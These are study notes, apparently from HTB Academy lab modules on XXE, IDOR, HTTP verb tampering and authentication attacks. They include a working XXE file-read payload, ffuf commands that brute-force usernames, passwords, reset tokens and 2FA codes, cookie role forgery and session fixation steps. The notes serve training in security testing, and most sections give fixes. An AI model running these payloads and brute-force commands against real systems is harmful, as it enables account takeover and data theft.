docs.title: Avoiding Outdated Components
docs.text:
XXE vulnerabilities often occur because an application uses outdated or unsafe XML parsing libraries.

Unlike vulnerabilities such as XSS, SQL Injection, and OS Injection, XML processing is usually handled by built-in libraries rather than manually written code.

What Should Be Updated?

  • XML parsing libraries.
  • API libraries that process XML, such as SOAP.
  • Document and file processors that parse XML, such as SVG and PDF processors.
  • Other outdated web components and dependencies, such as Node.js modules.

PHP Example

The following function is deprecated:

libxml_disable_entity_loader(false);

libxml_disable_entity_loader() has been deprecated since PHP 8.0.0. Relying on it is discouraged because it can enable unsafe external entity loading.

Key point: Keep XML libraries and all related components updated, and use their recommended secure parsing functions.

Reference: OWASP XXE Prevention Cheat Sheet

docs.title: Using Safe XML Configurations
docs.text:
XML parsers should be configured securely to prevent unsafe entity processing.

Important security configurations include:

  • Disable custom Document Type Definitions (DTDs).
  • Disable external XML entity references.
  • Disable parameter entity processing.
  • Disable XInclude support.
  • Prevent entity reference loops.

Proper Error Handling

Error-based XXE may expose file contents through application errors.

To reduce this risk:

  • Implement proper exception handling.
  • Disable displaying runtime errors on production web servers.
  • Avoid exposing sensitive debugging information to users.

Note: Hiding errors is an additional protection layer, not a replacement for securing the XML parser.

Consider Alternative Data Formats

Since XML introduces risks related to external entities and XML parsing, developers may consider using other data formats.

Examples:

  • Use JSON or YAML instead of XML where appropriate.
  • Avoid XML-based API standards such as SOAP when they are not necessary.
  • Consider JSON-based APIs, such as REST APIs.

Use a Web Application Firewall (WAF)

A WAF can provide another layer of protection against XXE attacks by detecting or blocking suspicious requests.

However:

  • A WAF should not be the primary security solution.
  • WAF rules can sometimes be bypassed.
  • The backend XML parser must still be configured securely.

docs.title: Section 18
docs.text:
We will combine three vulnerabilities covered in this module:

  1. HTTP Verb Tampering: Changing the HTTP method to bypass security checks that are applied only to a specific method, such as POST.
  2. IDOR (Insecure Direct Object Reference): Accessing another user's information by changing an object ID because the application fails to verify whether the current user is authorized to access that object.
  3. XXE (XML External Entity): Exploiting unsafe external entity resolution in an XML parser to read files from the server.

Step 1: Authenticate to the Application

Log in using the provided credentials:

Username: htb-student
Password: Academy_student!

After logging in, open Burp Suite and inspect the HTTP requests sent by the application.

Step 2: Identify the IDOR Vulnerability

Notice a request that retrieves user information using a user ID.

  1. Capture the request in Burp Suite.
  2. Identify the user ID parameter in the request.
  3. Change its value to another ID.
  4. Forward the modified request.

We will notice that the returned user information changes according to the supplied ID.

Result: This confirms an IDOR vulnerability because the application does not properly verify whether the current user is authorized to access the requested user's information.

Step 3: Find an Administrator Account

To escalate our privileges, we need to identify an account with higher privileges.

  1. Send the user information request to Burp Intruder.
  2. Configure the ID parameter as the payload position.
  3. Set the payload range to the first 100 IDs.
  4. Start the attack.
  5. Use the admin keyword to identify administrator-related responses.

We will notice that user ID 52 belongs to an administrator account.

Result: We have identified the administrator's user ID.

Step 4: Exploit HTTP Verb Tampering to Change the Administrator's Password

Navigate to the password change feature in the application settings.

We will notice that the password change process involves two requests.

Request 1 – Retrieve the password reset token:

GET /api.php/token/<uid>

Request 2 – Change the password:

POST /reset.php

Exploit IDOR to Retrieve the Administrator's Token

The token request contains a user ID, so we can test it for IDOR.

  1. Capture the token request.
  2. Change the user ID to 52.
  3. Forward the request.

The application successfully returns the administrator's password reset token.

Result: We have obtained the token associated with the administrator account.

Try 1 - Change the Administrator's Password

Now, modify the password reset request:

  • Change the user ID to 52.
  • Replace the original token with the administrator's token.
  • Submit the request.

We will receive:

Access Denied

This indicates that the password reset operation also depends on the current session cookie, even though we have the correct administrator ID and token.

Try 2 - Bypass the Cookie Dependency Using HTTP Verb Tampering

We can now use the first vulnerability covered in this module: HTTP Verb Tampering.

  1. Change the request method from POST to GET.
  2. Remove the session cookie.
  3. Keep the administrator's user ID and reset token.
  4. Send the modified request.

This time, the operation succeeds.

Result: We successfully changed the administrator's password without using the session cookie.

This indicates that the backend applies the authentication or authorization checks to the POST method but does not properly enforce them for the GET method.

Step 5: Log in as the Administrator

Use the administrator account with the new password:

Username: a.corrales
Password: 123456

After logging in, we will notice a new feature called:

Add Event

This feature is available to the administrator and will be our entry point for testing XXE.

Step 6: Identify the XXE Vulnerability

Open the Add Event feature and inspect the request using Burp Suite.

We will notice that the application sends XML data through:

POST /addEvent.php

The name value is reflected in the application's response.

First, test whether the XML parser processes custom entities.

Send the following payload:

<!DOCTYPE name [
    <!ENTITY hacker "bavthe0ne">
]>
<name>&hacker;</name>

The application responds with the entity value:

bavthe0ne

Result: This confirms that the XML parser processes our custom entity, indicating a potential XXE vulnerability.

Step 7: Read /flag.php Using XXE

Now that we have confirmed the XML entity processing, we can attempt to read the target file using an external entity.

Send the following payload:

<!DOCTYPE name [
    <!ENTITY hacker SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<name>&hacker;</name>

Final Attack Chain

flowchart TD
    A[Authenticate as htb-student] --> B[Identify IDOR in user information request]
    B --> C[Enumerate user IDs and find admin ID 52]
    C --> D[Retrieve admin password reset token]
    D --> E[Attempt password reset using POST - Access Denied]
    E --> F[Use HTTP Verb Tampering: POST to GET]
    F --> G[Change admin password without session cookie]
    G --> H[Log in as a.corrales]
    H --> I[Access Add Event feature]
    I --> J[Confirm XXE using an internal entity]
    J --> K[Read /flag.php using an external entity]
    K --> L[Decode Base64 and retrieve the flag]

docs.title: What is Authentication?
docs.text:
Authentication is the process of verifying the identity of a user, system, or entity to confirm that they are who they claim to be.

  • It is one of the first lines of defense against unauthorized access.
  • The most common method in web applications is a login form using a username and password.
  • Examples:
    • Email accounts
    • Online banking

docs.title: Authentication vs. Authorization
docs.text:
Authentication Authorization Determines who you are Determines what you can access Verifies identity using credentials Checks permissions using policies and rules Usually happens before authorization Usually happens after authentication Requires login details or authentication factors Requires user privileges or permission levels May use an ID Token to communicate identity May use an Access Token to grant or represent access

Example:

  • Authentication: You log in to a website using your email and password.
  • Authorization: The website checks whether your account has permission to access the admin dashboard.

Key Difference: Authentication verifies identity; authorization determines access permissions.

docs.title: Common Authentication Methods
docs.text: Authentication Factor Description Examples Knowledge-Based Authentication Something you know Password, passphrase, PIN, answers to security questions Ownership-Based Authentication Something you have or possess ID card, security token, smartphone with an authenticator app Inherence-Based Authentication Something you are or do biometric factors (Fingerprint, facial recognition, voice recognition)

docs.title: Single-Factor Authentication (SFA)
docs.text:
Single-factor authentication relies on only one authentication factor to verify a user's identity.

  • Example: Logging in using only a password.
  • It relies on a single type of proof, such as knowledge of a password.

docs.title: Multi-Factor Authentication (MFA)
docs.text:
Multi-factor authentication requires two or more authentication factors to verify a user's identity, MFA is commonly referred to as two-factor authentication (2FA).

  1. Enter your password (something you know).
  2. Enter a Time-Based One-Time Password (TOTP) generated by an authenticator app (something you possess).

Important: Using two passwords does not count as MFA because both belong to the same category: something you know.

docs.title: Attacks on Authentication
docs.text:
Authentication attacks can be categorized based on the three main authentication factors:

  • Knowledge-based: Something you know.
  • Ownership-based: Something you have.
  • Inherence-based: Something you are or do.

Each type has different weaknesses and attack methods.

docs.title: Attacking Knowledge-Based Authentication
docs.text:
Knowledge-based authentication is widely used and comparatively easy to attack. It relies on static information that attackers may obtain, guess, or brute-force.

Common weaknesses and attack methods:

  • Brute-force attacks: Repeatedly trying passwords or PINs until the correct one is found.
  • Guessing attacks: Using predictable passwords or personal information.
  • Social engineering: Tricking users into revealing their credentials.
  • Data breaches: Obtaining passwords or other sensitive information from compromised systems.

docs.title: Attacking Ownership-Based Authentication
docs.text:
Ownership-based authentication relies on something the user possesses, such as hardware tokens, smart cards, or other physical devices.

Advantages:

  • More resistant to common phishing and password-guessing attacks.
  • Physical objects are generally harder to acquire or replicate than information that can be guessed, phished, or stolen through data breaches.

Limitations:

  • Cost and logistics: Purchasing, distributing, and managing physical tokens or devices can be expensive and complicated, especially in large-scale deployments.
  • Physical attacks: Attackers may steal or clone the authentication device (NFC Badge Cloning)
  • Cryptographic attacks: Attackers may exploit weaknesses in the cryptographic algorithms used by the authentication system.

docs.title: Attacking Inherence-Based Authentication
docs.text:
Inherence-based authentication relies on biometric characteristics or behaviors, such as fingerprints, facial patterns, and other biometric data.

Advantages:

  • Convenient and user-friendly.
  • Users do not need to remember complex passwords.
  • Users do not need to carry physical authentication tokens.
  • Can reduce risks associated with weak passwords or stolen tokens.

Weaknesses and concerns:

  • Privacy risks: Biometric data is highly sensitive personal information.
  • Data security: Biometric databases must be securely protected.
  • Algorithmic bias: Biometric recognition algorithms may perform differently across individuals or groups.
  • Irreversible compromise: Unlike passwords, biometric characteristics generally cannot be changed if exposed.

docs.title: Example: BioStar 2 Data Breach (2019)
docs.text:
In 2019, attackers breached a company that developed biometric smart-lock systems managed through mobile and web applications.

The systems used fingerprints and facial patterns to identify authorized users.

Information exposed included:

  • Fingerprints
  • Facial patterns
  • Usernames and passwords
  • Access grants and permissions
  • Registered users' addresses

Why was this serious?

  1. The attackers obtained sensitive biometric and account information.
  2. Affected users could change their passwords to reduce the risk of further account compromise.
  3. However, users could not simply change their fingerprints or facial characteristics.
  4. Therefore, compromised biometric data could create a long-term security and privacy risk.

Source: BioStar 2 Biometric Data Breach Report

docs.title: Quick Comparison of Authentication Attacks
docs.text: Authentication Type Main Weaknesses Common Attack Methods Knowledge-Based Static information can be guessed, stolen, or obtained Brute force, password guessing, social engineering, data breaches Ownership-Based Physical devices can be stolen or cloned; cryptographic weaknesses may exist Theft, badge cloning, cryptographic attacks Inherence-Based Sensitive biometric data can be exposed and is difficult to replace Biometric data breaches, attacks exploiting recognition-system weaknesses

docs.title: What is User Enumeration?
docs.text:
User enumeration is a vulnerability that allows attackers to identify valid usernames or registered accounts by observing differences in a web application's behavior.

  • Commonly occurs in:

    • Login forms
    • Registration pages
    • Password reset functionality

  • Usernames may be sensitive because:

    • They can be required for authentication.
    • Users often reuse the same username across multiple services, such as web applications, FTP, RDP, and SSH.

docs.title: User Enumeration Theory
docs.text:
User enumeration creates a balance between security and user experience.

  • Revealing whether a username exists helps legitimate users identify typing mistakes.
  • However, attackers can use the same information to discover valid accounts.
  • Even mature applications, such as WordPress, may reveal username validity by default.

Example: WordPress Login

Input Error Message Result Invalid username Unknown username. Check again or try your email address. Username does not exist Valid username + wrong password The password you entered for the username editor is incorrect. Username exists Important: User enumeration is not always a vulnerability

Some applications, such as chat platforms, need username searches to help users find each other. One possible approach is to use email addresses for login instead of usernames, although this alone does not prevent enumeration if the application still reveals account validity.

docs.title: User Enumeration via Differing Error Messages
docs.text:
Attackers can discover valid usernames by submitting different usernames and analyzing the application's responses.

Common sources of usernames:

  • Username wordlists.
  • Crawling a web application.
  • Public company profiles on social networks.
  • OSINT (Open-Source Intelligence).
  • Publicly available information about employees and users.

Recommended wordlist collection: SecLists — Usernames

Example: Login Responses

Username Password Response Meaning abc invalid Unknown user Invalid username htb-stdnt invalid Invalid credentials Potentially valid username

Enumerating Users with FFUF 

ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
-u http://172.17.0.2/index.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=invalid" \
-fr "Unknown user"

Command breakdown:

Parameter Purpose -w Specifies the username wordlist -u Specifies the target URL -X POST Sends POST requests -H Sets the HTTP request header -d Specifies the POST request body FUZZ Marks the username value to replace with each wordlist entry -fr "Unknown user" Filters out responses containing Unknown user

Analyze the results

[Status: 200, Size: 3271, Words: 754, Lines: 103]
FUZZ: consuelo

consuelo is identified as a potentially valid username because its response does not contain Unknown user.

docs.title: User Enumeration via Side-Channel Attacks
docs.text:
A side-channel attack identifies users through indirect information about application behavior, rather than explicit differences in response messages by response timing.

How it works:

  1. Submit a login request with a candidate username.
  2. Measure the response time.
  3. Repeat the test to account for normal timing variations.
  4. Compare response-time patterns for different usernames.
  5. Determine whether valid and invalid usernames produce consistently different timings.

Example:

Username Type Application Behavior Possible Result Invalid username Application rejects the request without querying additional user data Faster response Valid username Application performs a database lookup or password verification Slower response

If the timing difference is consistent and statistically meaningful, it may reveal valid usernames even when the error messages are identical.

Warning

Timing differences are not guaranteed; network latency, caching, and other application processes can affect measurements.

docs.title: Understanding Password Brute-Forcing
docs.text:
Password brute-forcing is an attack that automatically tries multiple passwords until the correct one is found.

Common password security weaknesses include:

  • Password Reuse (prominent issue): Using the same password across multiple accounts. Attackers may try leaked passwords against other services, which is related to credential stuffing.
  • Weak Passwords: Using common words, predictable phrases, or simple patterns.
  • Password Spraying: Trying a small number of common passwords against multiple accounts to reduce the risk of account lockouts.
Note

The success of brute-forcing depends on the number of attempts allowed, the time required, and the quality of the wordlist.

docs.title: Create a Custom Password Wordlist
docs.text:
Before brute-forcing, check the application's password policy. In this example, passwords must contain:

  • At least one uppercase letter (A-Z).
  • At least one lowercase letter (a-z).
  • At least one digit (0-9).
  • At least 10 characters.

The rockyou.txt wordlist contains approximately 14.3 million passwords.

wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

docs.title: Method 1: Using grep
docs.text:
Filter passwords to match the application's policy:

grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt \
| grep '[[:lower:]]' \
| grep '[[:digit:]]' \
| grep -E '.{10}' \
> custom_wordlist.txt

Check the resulting wordlist size:

wc -l custom_wordlist.txt

Expected output from the example:

151647 custom_wordlist.txt

This reduces the wordlist by approximately 99%.

docs.title: Method 2: Using awk
docs.text:
The same filtering can be performed with a single command:

awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' \
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt \
> custom_wordlist.txt

docs.title: Brute-Force the Password with FFUF
docs.text:
Use FUZZ as the placeholder for each candidate password in the custom wordlist.

ffuf -w ./custom_wordlist.txt \
-u http://172.17.0.2/index.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=admin&password=FUZZ" \
-fr "Invalid username"

docs.title: Understanding Password Reset Tokens
docs.text:
Password reset functionality allows users to recover accounts when they forget their passwords. Applications commonly generate a one-time token and send it through email or SMS.

A typical password reset flow:

  1. The user requests a password reset.
  2. The application generates a reset token.
  3. The user receives the token through email or SMS.
  4. The user submits the token to verify the reset request.
  5. The application allows the user to set a new password.

Weak reset tokens can be guessed or brute-forced, potentially allowing unauthorized password resets and account takeover.

docs.title: Identify a Weak Reset Token
docs.text:
Example reset URL:

http://weak_reset.htb/reset_password.php?token=7351

The token is supplied through the GET parameter token.

In this example:

  • Token: 7351
  • Token length: 4 digits
  • Possible values: 0000 to 9999
  • Total possibilities: 104 = 10,000

A four-digit numeric token has a small search space, making it potentially vulnerable to brute-force attacks if the application lacks adequate protections.

docs.title: Generate a Token Wordlist
docs.text:
Use seq to generate every four-digit value:

seq -w 0 9999 > tokens.txt

The -w option pads values with leading zeros so every token has the same length.

docs.title: Test Reset Tokens with FFUF
docs.text:
ffuf -w ./tokens.txt \
-u "http://weak_reset.htb/reset_password.php?token=FUZZ" \
-fr "The provided token is invalid"

Example result

[Status: 200, Size: 2667, Words: 538, Lines: 90]
FUZZ: 6182

In the example, 6182 is the candidate token associated with a response that does not match the configured invalid-token filter. Verify the response to confirm that the token is valid; a different response alone does not guarantee success.

docs.text:
After Request Reset Password for user admin, use fuff to guess token

ffuf -w ./tokens.txt \
-u "http://154.57.164.76:31282/reset_password.php?token=FUZZ" \
-fr "The provided token is invalid"

docs.title: Understanding 2FA
docs.text:
Two-factor authentication (2FA) adds a second verification step to protect accounts, even if an attacker knows the user's password.

It combines two different authentication factors:

  • Knowledge: Something you know, such as a password.
  • Ownership: Something you have, such as a phone or authenticator app.
  • Inherence: Something you are, such as a fingerprint.

A common implementation combines a password with a one-time password (OTP) delivered by SMS or generated by an authenticator app.

docs.title: Identify the 2FA Mechanism
docs.text:
In this HTB lab, the assumed credentials are:

Username: admin
Password: admin

After login, the application redirects to /2fa.php and requests a 4-digit OTP.

There are 10,000 possible codes, from 0000 to 9999.

Inspect the 2FA request using Burp Suite or the browser's Developer Tools. The example request uses:

  • Endpoint: /2fa.php
  • Method: POST
  • POST parameter: otp
  • Session cookie: PHPSESSID
  • Failure message: Invalid 2FA Code

The session cookie associates the OTP verification request with the session that has already passed password authentication.

docs.title: Understand the FFUF Request
docs.text:
Generate a 4-Digit OTP Wordlist 

seq -w 0 9999 > tokens.txt

The request components are: 

ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

the Results

The HTB example returns several matches, including:

[Status: 302, Size: 0, Words: 1, Lines: 1]
FUZZ: 6513

[Status: 302, Size: 0, Words: 1, Lines: 1]
FUZZ: 6514

Why are there multiple results?

Once the correct OTP is submitted, the session may become fully authenticated. Subsequent requests using that session can then receive redirects instead of the usual invalid-code response. Those later responses may also appear as FFUF matches.

Therefore, the first match, 6513, is the likely correct OTP in the provided example, but the redirect and authenticated session should be verified to confirm it.

After successful verification, the lab indicates that the authenticated session can access /admin.php.

docs.title: Overview
docs.text:
Brute-force protection mechanisms prevent attackers from submitting large numbers of authentication attempts automatically.

Two common mechanisms are:

  • Rate Limiting: Restricts how many requests a user or client can make within a specific time.
  • CAPTCHA: Presents a challenge designed to distinguish humans from automated scripts.

docs.title: Rate Limits
docs.text:
Rate limiting controls the frequency of requests to protect applications from brute-force attacks, abuse, and excessive traffic.

How it works

A web application may:

  • Allow only a certain number of login attempts within a time window.
  • Introduce increasing delays after failed attempts.
  • Temporarily block further attempts after a threshold is reached.

Potential weakness: X-Forwarded-For

Applications behind reverse proxies or load balancers may see the proxy's IP address instead of the original client's address.

Some applications use the HTTP header X-Forwarded-For to identify the originating IP address.

Example:

X-Forwarded-For: 192.0.2.10

If an application blindly trusts this client-controlled header, an attacker may supply different values in successive requests, potentially bypassing IP-based rate limiting.

docs.title: CAPTCHAs
docs.text:
CAPTCHA stands for Completely Automated Public Turing test to tell Computers and Humans Apart.

It attempts to distinguish human users from automated clients before allowing an action, such as submitting a login form.

Common types include:

  • Distorted-text recognition.
  • Selecting specific objects in images.
  • Puzzle-based challenges.
  • Audio challenges.

CAPTCHAs can make automated attacks more difficult, but they can also create accessibility and usability problems.

Potential weakness: Exposed CAPTCHA solutions

A CAPTCHA implementation is flawed if the expected solution is exposed to the client in a way that allows an attacker to retrieve it without solving the challenge.

For example, inspect the page's HTML and network responses to determine whether the expected answer is accidentally included in client-visible data.

docs.title: Understanding Default Credentials
docs.text:
Default credentials are usernames and passwords provided by vendors during installation or initial setup.

If administrators fail to change them, attackers may gain unauthorized access to the application.

Common examples include:

  • admin:password
  • Vendor-specific default usernames and passwords.
  • Default administrator accounts documented in installation guides.

Testing for default credentials is an important part of authentication security testing and is covered by the OWASP Web Security Testing Guide.

docs.title: Method 1: Search default credential databases
docs.text:
Use vendor-specific databases to identify credentials associated with a product or device.

  • CIRT.net Default Password Database
  • SecLists — Default Credentials
  • SCADAPASS — default password references for various industrial vendors.

Example: If you identify a Cisco device during an authorized penetration test, search the database for default credentials for Cisco devices

docs.title: Method 2: Search the internet
docs.text:
Search for the application's name along with terms such as default credentials, default login, or installation guide.

Example search:

BookStack default credentials

Installation documentation may reveal the initial administrator account.

Email:    admin@admin.com
Password: password

docs.title: Guessable Password Reset Questions
docs.text:
Web applications may use predefined security questions to verify a user's identity before allowing a password reset.

Examples include:

  • What is your mother's maiden name?
  • What city were you born in?

These questions are often vulnerable because their answers may be predictable, publicly available through OSINT, or discoverable through brute-force attacks when protections are missing.

Suppose the application asks for the city where the target was born. A list of cities can be used to create a wordlist world-cities.csv.

Extract city names from a CSV file:

cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

Count the entries:

wc -l city_wordlist.txt

Example output:

26468 city_wordlist.txt

If you have information about the target's country, you can reduce the wordlist:

cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

wc -l german_cities.txt

Example output:

1117 german_cities.txt

The application may follow this process:

  1. Submit the target username.
  2. Answer the security question.
  3. Submit a new password.

Test security-question validation

ffuf -w ./city_wordlist.txt \
-u http://pwreset.htb/security_question.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-b "PHPSESSID=<SESSION_ID>" \
-d "security_response=FUZZ" \
-fr "Incorrect response."

docs.title: Manipulating the Reset Request
docs.text:
Another business logic flaw occurs when the application trusts a username supplied by the client instead of securely binding the reset process to the account initially selected.

Step 1: Submit your own username

For example:

POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded

username=htb-stdnt

The application begins the password reset process for htb-stdnt.

Step 2: Submit the security answer

The next request includes the username as a hidden form parameter:

POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded

security_response=London&username=htb-stdnt

The username is client-controlled because it is included in the request. Hidden parameters are not inherently secure; users can modify them.

Step 3: Inspect the final password reset request

The application sends another username parameter when submitting the new password:

POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded

password=<NEW_PASSWORD>&username=htb-stdnt

The key question is whether the server verifies that this username belongs to the same account whose security question was successfully answered.

Step 4: Test for inconsistent account validation

In an authorized lab, modify the final request's username to another test account and observe the result.

For example, changing:

username=htb-stdnt

to:

username=admin

tests whether the application incorrectly allows the final request to target a different account.

If the server accepts the change without verifying the original reset authorization, an attacker may be able to reset another user's password without answering that user's security question.

Root cause: The application fails to bind the verified identity to the entire password reset transaction.

docs.title: Overview
docs.text:
Direct access authentication bypass occurs when a web application fails to enforce authentication checks on protected resources or returns protected content before completing the authentication check.

For example, a website may redirect unauthenticated users from /admin.php to the login page. However, if the server still includes the admin page's content in the response body, the protected information may remain accessible.

docs.title: How the Vulnerability Works
docs.text:
Suppose a website redirects authenticated users to /admin.php after login.

An attacker can try accessing the endpoint directly without logging in:

GET /admin.php HTTP/1.1
Host: target.htb

If the server does not properly enforce authentication, it may return the protected content.

Vulnerable PHP code

if (!$_SESSION['active']) {
    header("Location: index.php");
}

The problem is that header("Location: index.php") sends a redirect response but does not stop PHP execution.

As a result, the application may continue executing the script and include the protected page's content in the response body, even though the response status is 302 Found.

Testing with Burp Suite

  1. Open Burp Suite and enable Proxy interception.
  2. Request a protected endpoint such as /admin.php without authenticating.
  3. Inspect the server response.
  4. Check whether the response body contains protected content despite the redirect.
  5. If necessary, use Burp's Do intercept → Response to this request option to inspect the response before forwarding it.
  6. In an authorized lab, change the response status from 302 Found to 200 OK and forward it to observe whether the browser renders the content.

How to Fix It

The PHP script must stop execution immediately after sending the redirect.

if (!$_SESSION['active']) {
    header("Location: index.php");
    exit;
}

The exit statement prevents the remaining script from executing.

docs.title: Overview
docs.text:
Authentication bypass via parameter modification occurs when a web application incorrectly relies on a client-controlled HTTP parameter to determine a user's identity or privileges.

An attacker may modify or remove parameters in a URL or request to bypass authentication checks or gain unauthorized access to privileged functionality.

This vulnerability can overlap with Insecure Direct Object Reference (IDOR) and broken access control.

docs.title: Understanding the Vulnerability
docs.text:
Suppose a user logs in with the account htb-stdnt. After successful login, the application redirects them to:

/admin.php?user_id=183

The page displays limited information and reports insufficient privileges.

The user_id parameter may be influencing how the application identifies the user or determines their access level.

Step 1: Inspect the parameter

Check the URL and HTTP requests in Burp Suite.

GET /admin.php?user_id=183 HTTP/1.1
Host: target.htb
Cookie: PHPSESSID=<SESSION_ID>

Observe how the application responds when the parameter is present.

Step 2: Remove the parameter

Request the same endpoint without user_id:

GET /admin.php HTTP/1.1
Host: target.htb
Cookie: PHPSESSID=<SESSION_ID>

In the HTB example, the application redirects to the login page even though the session cookie remains valid.

This suggests that the application may be incorrectly using user_id as part of its authentication logic.

Step 3: Test direct access

Request the original URL again:

GET /admin.php?user_id=183 HTTP/1.1
Host: target.htb
Cookie: PHPSESSID=<SESSION_ID>

The example application returns 200 OK, indicating that the parameter affects access to the page.

However, a 200 OK response alone does not prove authentication bypass. Confirm whether protected information or privileged functionality is actually accessible.

Step 4: Test authorization enforcement

In an authorized lab, investigate whether changing the parameter to another user ID changes the privileges granted.

For example:

/admin.php?user_id=183
/admin.php?user_id=<OTHER_USER_ID>

If changing the ID allows access to another user's data or administrative functions without proper authorization, the application may have an IDOR or broken access control vulnerability.

If the application grants administrator privileges solely because a client supplies an administrator's ID, this is a serious authorization flaw.

Why This Happens

The underlying problem is trusting client-controlled input to establish identity or permissions.

For example, an insecure implementation might use:

$user_id = $_GET['user_id'];

and then use $user_id to determine access without verifying that the authenticated session belongs to that user or has the required privileges.

The parameter itself is not inherently vulnerable. The vulnerability exists when the server uses it without appropriate authentication and authorization checks.

docs.title: Overview
docs.text:
A session token is a unique identifier used by a web application to associate requests with a user's authenticated session.

If an attacker obtains or forges a valid session token, they may be able to impersonate another user without knowing their password.

Common session token vulnerabilities include:

  • Brute-forceable tokens: Tokens are too short or have insufficient entropy.
  • Predictable tokens: Tokens: follow a pattern, such as sequential numbers.
  • Partially random tokens: Most of the token is static, leaving only a small portion unpredictable.
  • Encoded tokens: Tokens contain Base64, hexadecimal, or URL-encoded data that can be modified without integrity protection.
  • Weakly protected encrypted tokens: Poor cryptographic design or implementation allows tokens to be forged or manipulated.

docs.title: Short session tokens
docs.text:
Consider a web application that issues a four-character hexadecimal session token:

Set-Cookie: session=a5fd

A four-character hexadecimal token has only: 164 = 65,536 possible combinations.

This is a small search space, making brute-force attacks potentially practical if the application lacks effective protections.

docs.title: Partially random tokens
docs.text:
A token may appear long but contain mostly static characters.

Example tokens:

2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9

The tokens share a common prefix and suffix 28 characters are the same for all five captured sessions. In this example, only four hexadecimal characters vary.

The session tokens consist of the static string 2c0c58b27c71a2ec5bf2b4 followed by four random characters and the static string 92b9f9

The effective search space for that varying portion is: : 164 = 65,536 possible combinations.

Testing approach:

  1. Log in repeatedly to your authorized test account.
  2. Capture the session tokens.
  3. Compare their prefixes, suffixes, and changing portions.
  4. Determine whether the changing portion appears random or follows a pattern.
  5. Evaluate the effective entropy rather than relying on token length alone.

docs.title: Attacking Predictable Session Tokens
docs.text: Some tokens contain encoded information about the user or their role.

docs.title: Base64-encoded tokens
docs.text:
Example cookie:

dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy

Decode it:

echo -n 'dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy' | base64 -d

Output:

user=htb-stdnt;role=user

This reveals that the token contains a username and role.

Base64 is an encoding scheme, not encryption. Anyone who obtains the token can decode its contents.

Modifying the token

Suppose the application trusts the role embedded in the cookie and does not verify its integrity.

The original data is:

user=htb-stdnt;role=user

A modified version would be:

user=htb-stdnt;role=admin

Encode the modified value:

echo -n 'user=htb-stdnt;role=admin' | base64

Example output:

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==

In an authorized lab, this illustrates how an application that trusts unsigned client-side role data may allow privilege escalation.

docs.title: Overview
docs.text:
Session management vulnerabilities can allow attackers to hijack authenticated sessions or continue using sessions longer than intended.

This section covers two common vulnerabilities:

  1. Session Fixation — an attacker causes a victim to authenticate using a session ID already known to the attacker.
  2. Improper Session Timeout — a session remains valid longer than the application's security requirements allow.

docs.title: Session Fixation
docs.text:
Session fixation occurs when a web application does not generate a new session ID after successful authentication.

If an attacker can make a victim use a session ID known to the attacker, the attacker may be able to reuse that ID to access the victim's authenticated session.

Step 1: Obtain a session ID

The attacker obtains a session ID, for example a1b2c3d4e5f6.

Step 2: Make the victim use that ID

The vulnerable application accepts a session ID from a URL parameter such as sid and sets it as a cookie.

Step 3: The victim logs in

The application authenticates the victim but fails to replace the existing session ID.

Step 4: Session hijacking

The attacker attempts to reuse the known session ID to access the victim's authenticated session.

Example

A vulnerable application accepts this URL:

http://vulnerable.htb/?sid=a1b2c3d4e5f6

It then sets the session cookie using the supplied value:

HTTP/1.1 200 OK
Set-Cookie: session=a1b2c3d4e5f6

If the application continues using this session ID after the victim logs in, the attacker may be able to hijack the authenticated session.

Root cause: The application allows a session identifier to be controlled externally and fails to rotate it after authentication.

How to test for session fixation

  • Inspect how session IDs are created and assigned.
  • Check whether URL parameters or other client-controlled inputs can set the session ID.
  • Record the session ID before authentication.
  • Log in using an authorized test account and record the session ID afterward.
  • Verify that successful authentication generates a new session ID.
  • Confirm that the old session ID cannot access the authenticated session.

docs.title: Improper Session Timeout
docs.text:
A session timeout defines how long an authenticated session remains valid before the application requires the user to authenticate again.

Without appropriate expiration, a stolen session token may remain usable for an extended period, increasing the impact of session hijacking.

Types of session timeout

Timeout type Description Idle timeout Expires a session after a period of inactivity. Absolute timeout Expires a session after a maximum lifetime, even if the user remains active.

How to test for improper timeout

  1. Log in to an authorized test account.
  2. Capture the session cookie.
  3. Leave the session inactive for the application's expected timeout period.
  4. Attempt to access a protected endpoint using the existing session.
  5. Check whether the server rejects the expired session and requires reauthentication.
  6. If applicable, test whether continued activity prevents expiration beyond the intended absolute lifetime.

docs.title: Section 14
docs.text:
Password Policy, Username Enumeration, Password Brute-Force & Direct Access Bypass

Step 1: Create a New Account and Identify the Password Policy

First, register a new account to understand the application's registration process and password requirements.

For example, try:

Username: bavly
Password: 123456

The application returns the following error:

Password does not meet our password policy:

- Contains at least one digit
- Contains at least one lower-case character
- Contains at least one upper-case character
- Contains NO special characters
- Is exactly 12 characters long

From this response, we can identify the password policy

Step 2: Create an Account and Generate a Custom Password Wordlist

Create the account using a password that meets the requirements.

Username: bavly
Password: HackerBav0ne

Next, filter rockyou.txt to generate a wordlist containing passwords that match the application's policy.

